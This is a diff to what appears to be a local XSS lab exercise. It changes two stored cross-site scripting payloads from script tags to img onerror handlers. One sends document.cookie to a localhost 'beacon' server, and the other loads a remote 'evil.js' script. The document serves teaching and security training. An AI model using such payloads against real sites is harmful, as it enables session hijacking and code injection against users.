@@ -11,13 +11,13 @@ All four servers running, with exercise 3's planted entry still on the board
 (re-post it if you reset the message list):
 
 ```html
-<script>new Image().src = 'http://127.0.0.1:5000/beacon.png?c=' + encodeURIComponent(document.cookie);</script>
+<img src="x" onerror="new Image().src = 'http://127.0.0.1:5000/beacon.png?c=' + encodeURIComponent(document.cookie);">
 ```
 
 You can also try the external-script variant:
 
 ```html
-<script src="http://127.0.0.1:5000/evil.js"></script>
+<img src="x" onerror="import('http://127.0.0.1:5000/evil.js')">
 ```
 
 ## Watch the attack succeed
